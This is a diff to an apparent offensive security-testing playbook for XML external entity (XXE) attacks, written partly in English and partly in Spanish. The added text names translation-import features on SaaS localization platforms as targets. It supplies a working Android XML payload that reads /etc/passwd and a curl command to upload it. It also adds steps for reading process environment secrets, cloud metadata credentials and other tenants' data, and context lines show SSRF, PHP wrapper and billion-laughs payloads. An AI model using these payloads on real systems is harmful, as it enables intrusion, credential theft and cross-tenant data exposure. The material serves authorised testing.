@@ -33,6 +33,10 @@ chains_with: [ssrf, info-disclosure, lfi-rfi]
   frameworks auto-detect content-type and parse both).
 - Error messages revealing the underlying XML parser (`libxml`, `Xerces`, `SAXParseException`,
   `DOMDocument`) — a strong hint external entity resolution might be enabled.
+- **Translation/localization import features** — apps accepting XLIFF, Android XML resources,
+  Apple stringsdict, .resx, or YAML-with-XML: each format has its own parser code path, so a
+  single import feature may have multiple unhardened entry points. SaaS translation platforms
+  (Tolgee, Crowdin, Lokalise, Phrase) and any app with i18n file upload are prime targets.
 
 ## Prerequisites
 
@@ -146,7 +150,28 @@ chains_with: [ssrf, info-disclosure, lfi-rfi]
      --httpmethod=POST --oob=http
    ```
 
-9. **Denial-of-service variant (billion laughs)** — only with explicit operator approval given
+9. **Translation/localization file XXE.** When the app imports translation files, craft a valid
+   file in each accepted format with a DOCTYPE entity. Each format has its own parser — one may
+   be hardened while others aren't:
+   ```bash
+   # Android XML resources
+   cat > xxe_android.xml << 'XMLEOF'
+   <?xml version="1.0" encoding="utf-8"?>
+   <!DOCTYPE resources [
+     <!ENTITY xxe SYSTEM "file:///etc/passwd">
+   ]>
+   <resources>
+     <string name="test_key">&xxe;</string>
+   </resources>
+   XMLEOF
+   curl -s -X POST https://target/v2/projects/1/import -F "file=@xxe_android.xml" \
+     -H "Authorization: Bearer $TOKEN"
+   ```
+   Then check if the imported translation value contains the file contents. Repeat with XLIFF,
+   .resx, and stringsdict payloads. On multi-tenant SaaS, any authenticated user with import
+   permission reaches the parsers — sign up, create a project, import.
+
+10. **Denial-of-service variant (billion laughs)** — only with explicit operator approval given
    it's a resource-exhaustion attack, not a read primitive:
    ```xml
    <!DOCTYPE lolz [
@@ -178,6 +203,7 @@ camino a `Demonstrated` es un hit correlacionado por token en el gate OOB (exter
 | SSRF via entity | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` | Entity como primitiva de red interna |
 | PHP wrapper | `php://filter/convert.base64-encode/resource=index.php` | Leer fuente sin romper el XML con binarios |
 | File-format wrapped | SVG/DOCX/XLSX con DOCTYPE inyectado en `document.xml` | Entregar XXE por upload |
+| Translation file XXE | Android XML resources / XLIFF / .resx / stringsdict con DOCTYPE + entity | Cada formato usa un parser distinto; probar todos |
 | Parameter entity | `<!ENTITY % ...>` anidado (`%eval; %exfil;`) | Único vector cuando entities generales están bloqueadas |
 | Billion laughs (DoS) | `<!ENTITY lol2 "&lol;&lol;...">` expansión exponencial | Solo con gate de operador (es DoS, no read) |
 
@@ -264,6 +290,8 @@ Before declaring this finding complete, probe these escalation paths:
 2. **SSRF via entity** — Can you trigger SSRF by pointing an external entity at an internal URL?
 3. **OOB exfiltration** — When in-band extraction fails, can you exfiltrate data out-of-band (error-based, or FTP/HTTP collaborator)?
 4. **Parameter entity support** — Does the parser support parameter entities? Needed for OOB exfiltration of multi-line files.
+5. **Multi-format import surface** — Does the feature accept multiple XML-based formats (XLIFF + Android XML + .resx + stringsdict)? Each format may use a different parser/code path — test all of them, not just the first that works. One may be hardened while others aren't.
+6. **Multi-tenant escalation** — On SaaS, can XXE read `/proc/self/environ` (DB credentials, JWT signing keys, encryption keys), cloud metadata (169.254.169.254 IAM role), or other tenants' data? A single-tenant file read vs. cross-tenant credential recovery is a different severity tier.
 
 A finding without chain anchor results is INCOMPLETE. Record each anchor as
 tested/not-applicable/blocked with the reason.
